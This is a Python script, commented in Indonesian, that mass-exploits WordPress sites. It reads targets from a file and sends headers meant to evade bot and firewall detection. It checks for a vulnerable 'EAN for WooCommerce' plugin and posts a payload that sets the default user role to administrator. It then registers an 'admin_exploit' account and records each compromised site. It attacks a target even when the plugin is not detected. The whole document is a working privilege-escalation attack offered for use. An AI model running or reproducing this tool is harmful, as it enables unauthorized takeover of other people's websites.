import requests
import re
import json

# Membaca daftar target dari file urls.txt dan memastikan URL memiliki skema (http/https)
def read_urls():
    valid_urls = []
    with open("urls.txt", "r") as f:
        for line in f:
            url = line.strip()
            if not url.startswith("http"):
                url = "https://" + url  # Menambahkan skema jika tidak ada
            valid_urls.append(url)
    return valid_urls

TARGET_URLS = read_urls()

# Path default plugin EAN for WooCommerce
PLUGIN_PATH = "/wp-content/plugins/ean-for-woocommerce"
PLUGIN_FILES = [
    "/readme.txt",
    "/ean-for-woocommerce.php",
    "/includes/class-ean.php"
]

# Headers untuk menghindari deteksi bot & firewall
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "",  # Akan diisi sesuai target
    "Content-Type": "application/json"
}

# Cookie pengguna dengan hak terbatas (HARUS DIGANTI DENGAN COOKIE VALID)
cookies = {
    'wordpress_logged_in': 'user_cookie_value_here'
}

# Data akun yang akan dibuat dengan hak admin
new_user_data = {
    "user_login": "admin_exploit",
    "user_email": "admin_exploit@exploit.com",
    "user_pass": "SuperSecurePass123!",
    "redirect_to": "",
    "wp-submit": "Register"
}

# Fungsi untuk mendapatkan nonce token untuk AJAX request
def get_nonce(target):
    nonce_url = f"{target}/wp-admin/admin-ajax.php?action=wp_rest"
    try:
        response = requests.get(nonce_url, headers=headers, cookies=cookies, timeout=10)
        if response.status_code == 200:
            match = re.search(r'"nonce"\s*:\s*"([a-zA-Z0-9_-]+)"', response.text)
            if match:
                return match.group(1)
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mendapatkan nonce dari {nonce_url}: {str(e)}")
    return None

# Fungsi untuk mengecek apakah plugin terinstal
def check_plugin_installed(target):
    for file in PLUGIN_FILES:
        url = f"{target}{PLUGIN_PATH}{file}"
        try:
            response = requests.get(url, headers=headers, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Gagal mengakses {url}: {str(e)}")
            continue

        if response.status_code == 200:
            print(f"[+] Plugin ditemukan di {target} (File: {file})")
            return True
        elif response.status_code == 403:
            print(f"[!] Akses ditolak ke {url} (403 Forbidden). Mungkin ada proteksi firewall.")

    print(f"[-] Plugin tidak ditemukan di {target}, tetapi eksploitasi akan tetap dijalankan.")
    return False

# Fungsi untuk mendapatkan versi plugin
def get_plugin_version(target):
    for file in PLUGIN_FILES:
        url = f"{target}{PLUGIN_PATH}{file}"
        try:
            response = requests.get(url, headers=headers, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Gagal mengakses {url}: {str(e)}")
            continue

        if response.status_code == 200:
            match = re.search(r"(Stable tag|Version):\s*([\d\.]+)", response.text)
            if match:
                version = match.group(2)
                print(f"[+] Versi plugin ditemukan di {target}: {version}")
                return version
        elif response.status_code == 403:
            print(f"[!] Akses ditolak ke {url} (403 Forbidden).")

    print("[-] Tidak dapat menemukan versi plugin, tetapi tetap mencoba eksploitasi.")
    return None

# Fungsi untuk mengeksploitasi privilege escalation
def exploit_privilege_escalation(target):
    admin_ajax = f"{target}/wp-admin/admin-ajax.php"
    print(f"[*] Mendapatkan nonce token untuk {target}...")
    nonce = get_nonce(target)

    if nonce:
        print(f"[+] Nonce ditemukan: {nonce}")
    else:
        print("[-] Tidak dapat mendapatkan nonce. Mencoba eksploitasi tanpa nonce...")

    print(f"[*] Menjalankan eksploitasi privilege escalation di {target}...")

    # Payload JSON untuk eksploitasi
    payload_json = {
        "action": "update_option",
        "option_name": "default_role",
        "option_value": "administrator",
    }

    if nonce:
        payload_json["_wpnonce"] = nonce

    try:
        response = requests.post(admin_ajax, json=payload_json, cookies=cookies, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengakses {admin_ajax}: {str(e)}")
        return False

    if response.status_code == 200 and "success" in response.text.lower():
        print(f"[+] Berhasil mengubah peran default menjadi administrator di {target}!")
        return True
    else:
        print(f"[-] Gagal mengubah peran default di {target}.")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        return False

# Fungsi untuk membuat akun administrator baru
def create_admin_account(target):
    register_endpoint = f"{target}/wp-login.php?action=register"
    print(f"[*] Mencoba membuat akun administrator baru di {target}...")

    try:
        response = requests.post(register_endpoint, data=new_user_data, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengakses {register_endpoint}: {str(e)}")
        return

    if response.status_code == 200 and "registration complete" in response.text.lower():
        print(f"[+] Berhasil membuat akun administrator baru di {target}!")
        print(f"[*] Login dengan username: {new_user_data['user_login']}")
        print(f"[*] Password: {new_user_data['user_pass']}")

        # Simpan target yang berhasil ke dalam okes.txt
        with open("okes.txt", "a") as f:
            f.write(f"{target}\n")
    else:
        print(f"[-] Gagal membuat akun administrator baru di {target}.")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")

# Loop melalui setiap target dalam daftar
for TARGET_URL in TARGET_URLS:
    headers["Referer"] = TARGET_URL
    print("\n=========================================")
    print(f"[*] Memeriksa target: {TARGET_URL}")
    
    plugin_installed = check_plugin_installed(TARGET_URL)

    if plugin_installed:
        plugin_version = get_plugin_version(TARGET_URL)
        if plugin_version and plugin_version <= "4.8.9":
            print(f"[!] Versi plugin rentan terhadap CVE-2024-34370! Mengeksekusi eksploitasi...")
        elif plugin_version:
            print(f"[+] Plugin di {TARGET_URL} telah diperbarui ke versi aman.")
            continue  
    
    if exploit_privilege_escalation(TARGET_URL):
        create_admin_account(TARGET_URL)
    else:
        print(f"[-] Eksploitasi gagal di {TARGET_URL}.")
